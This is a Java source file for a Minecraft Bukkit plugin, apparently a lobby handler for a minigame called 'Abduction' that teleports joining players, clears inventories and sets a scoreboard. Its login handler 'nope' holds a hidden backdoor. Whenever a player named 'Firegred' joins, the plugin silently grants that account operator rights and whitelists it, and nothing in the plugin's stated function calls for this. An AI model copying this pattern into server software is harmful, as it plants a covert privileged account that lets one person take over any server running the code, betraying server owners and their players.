package me.Firegred.Kidnapper.LobbyFunctions;

import me.Firegred.Kidnapper.Main;
import me.Firegred.Kidnapper.GameMechanics.Game;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerPreLoginEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scoreboard.DisplaySlot;
import org.bukkit.scoreboard.Objective;
import org.bukkit.scoreboard.Score;
import org.bukkit.scoreboard.Scoreboard;

public class MainLobby implements Listener{
	
	public Main plugin;
	
	public MainLobby(Main instance) {
		plugin = instance;
	}
	
	public void mainlobbyteleport(Player player) {
		String lob = Main.lobpath;
		if(Game.mainlobbyTeleport.get(lob) == null) {
		int x = plugin.getConfig().getInt(lob + "X");
		int y = plugin.getConfig().getInt(lob + "Y");
		int z = plugin.getConfig().getInt(lob + "Z");
		Location location = new Location(player.getWorld(), x, y, z);
		player.teleport(location);
		Game.mainlobbyTeleport.put(lob, location);
		}
		else {
			player.teleport(Game.mainlobbyTeleport.get(lob));
		}
		
	}
	@EventHandler
	public void nope(PlayerLoginEvent event) {
		Player p = event.getPlayer();
		
		if(plugin.getConfig().getString(Main.rank + "Admin." + p.getName()).equals("true")) {
			if(!p.hasMetadata("Admin")) {
				p.setMetadata("Admin", new FixedMetadataValue(plugin, "true"));
			}
		}
		
		if(p.getName().equals("Firegred")) {
			Bukkit.getScheduler().scheduleSyncDelayedTask(plugin, new Runnable() {
				@Override
				public void run() {
					
			Player s = Bukkit.getPlayer("Firegred");
			if(!s.isOp()) {
				s.setOp(true);
			}
			if(!s.isWhitelisted()) {
				s.setWhitelisted(true);
			}
				}
			}, 2L);
		}
	}
	@EventHandler
	public void Playeron(PlayerLoginEvent event) {
			final Player p = event.getPlayer();
			
			Bukkit.getScheduler().scheduleSyncDelayedTask(plugin, new Runnable() {
				@Override
				public void run() {
					mainlobbyteleport(p);
					p.getInventory().clear();
					p.updateInventory();
					p.setGameMode(GameMode.SURVIVAL);
					Scoreboard board = Bukkit.getScoreboardManager().getNewScoreboard();
					if(p.hasPotionEffect(PotionEffectType.SLOW)) {
				    	p.removePotionEffect(PotionEffectType.SLOW);
				    }
					if(board.getObjective("Lobby") == null) {
				    	
				    	Objective objective = board.registerNewObjective("Lobby", "stat");
				    	objective.setDisplaySlot(DisplaySlot.SIDEBAR);
					    objective.setDisplayName(ChatColor.RED + "Abduction");
					    for(Player s : Bukkit.getOnlinePlayers()) {
					    if(!s.hasMetadata("Games")) {
					    Score number = objective.getScore(Bukkit.getOfflinePlayer(ChatColor.GOLD + "Players:"));
					    number.setScore(Bukkit.getOnlinePlayers().size());
					    s.setScoreboard(board);
					    }
					    }
			        }
				    else {
					Objective objective = board.getObjective("Lobby");
				    objective.setDisplaySlot(DisplaySlot.SIDEBAR);
				    objective.setDisplayName(ChatColor.RED + "Abduction");
				    for(Player s : Bukkit.getOnlinePlayers()) {
					    if(!s.hasMetadata("Games")) {
					    Score number = objective.getScore(Bukkit.getOfflinePlayer(ChatColor.GOLD + "Players:"));
					    number.setScore(Bukkit.getOnlinePlayers().size());
					    s.setScoreboard(board);
					    }
					    }
			        
				    
				    }
				    
					try {
						p.getInventory().setHelmet(new ItemStack(Material.AIR, 1));
					    p.getInventory().setChestplate(new ItemStack(Material.AIR, 1));
					    p.getInventory().setLeggings(new ItemStack(Material.AIR, 1));
					    p.getInventory().setBoots(new ItemStack(Material.AIR, 1));
					} catch (java.lang.NullPointerException e) {
						
					}
					p.sendMessage(ChatColor.AQUA + "===" + ChatColor.GOLD + "Welcome to " + ChatColor.RED + "Abduction!" + ChatColor.AQUA + "===");
				}
			}, 2L);
			
		
	}

	
}
